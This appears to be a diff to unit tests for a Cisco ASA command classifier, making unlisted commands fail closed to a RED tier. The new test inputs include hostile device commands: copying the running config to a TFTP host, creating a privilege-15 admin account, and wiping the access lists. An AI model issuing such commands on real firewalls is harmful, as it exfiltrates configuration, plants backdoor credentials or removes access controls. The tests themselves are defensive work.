@@ -173,12 +173,16 @@ static void test_command_routing(void)
     assert(asa_route_command("write erase") == VIRP_TIER_BLACK);
     PASS();
 
-    TEST("unmapped command → YELLOW");
-    assert(asa_route_command("show tech-support") == VIRP_TIER_YELLOW);
+    /* RELIER on the old YELLOW default — NOT added to the table.
+     * This is a legitimate command that was never listed; it executed
+     * only because the no-match default cleared the gate. Now RED.
+     * Listing it is a deliberate tier decision, not a bug fix. */
+    TEST("unmapped: show tech-support → RED (fail closed)");
+    assert(asa_route_command("show tech-support") == VIRP_TIER_RED);
     PASS();
 
-    TEST("null command → YELLOW");
-    assert(asa_route_command(NULL) == VIRP_TIER_YELLOW);
+    TEST("null command → RED (fail closed)");
+    assert(asa_route_command(NULL) == VIRP_TIER_RED);   /* fail closed */
     PASS();
 }
 
@@ -678,6 +682,38 @@ static void test_legit_matches_unaffected(void)
     assert(asa_route_command("reload") == VIRP_TIER_BLACK); PASS();
 }
 
+
+/* =========================================================================
+ * No-match default must FAIL CLOSED (P0)
+ *
+ * ASA's classifier returned YELLOW when no table entry matched. The
+ * default gate threshold is YELLOW, so an unlisted command CLEARED the
+ * gate and executed. Only the Cisco classifier failed closed to RED.
+ *
+ * Each command below is plausible, unlisted, and state-changing or
+ * sensitive — every one of them executed before this change.
+ * ========================================================================= */
+
+static void test_no_match_fails_closed(void)
+{
+    printf("\n=== No-match default fails closed to RED ===\n");
+
+    TEST("unlisted: copy running-config tftp://10.0.0.9/cfg -> RED (config exfiltration to TFTP)");
+    assert(asa_route_command("copy running-config tftp://10.0.0.9/cfg") == VIRP_TIER_RED); PASS();
+
+    TEST("unlisted: username admin password Str0ng privilege 15 -> RED (privileged credential creation)");
+    assert(asa_route_command("username admin password Str0ng privilege 15") == VIRP_TIER_RED); PASS();
+
+    TEST("unlisted: clear configure access-list -> RED (wipes the ACL configuration)");
+    assert(asa_route_command("clear configure access-list") == VIRP_TIER_RED); PASS();
+
+    TEST("unlisted: show capture CAP1 -> RED (packet-capture read)");
+    assert(asa_route_command("show capture CAP1") == VIRP_TIER_RED); PASS();
+
+    TEST("NULL command -> RED (fail closed)");
+    assert(asa_route_command(NULL) == VIRP_TIER_RED); PASS();
+}
+
 int main(void)
 {
     printf("VIRP Cisco ASA Driver — Unit Tests\n");
@@ -697,6 +733,7 @@ int main(void)
 
     test_adversarial_separators();
     test_legit_matches_unaffected();
+    test_no_match_fails_closed();
     printf("\n===================================\n");
     printf("Results: %d/%d passed\n", tests_passed, tests_run);
 
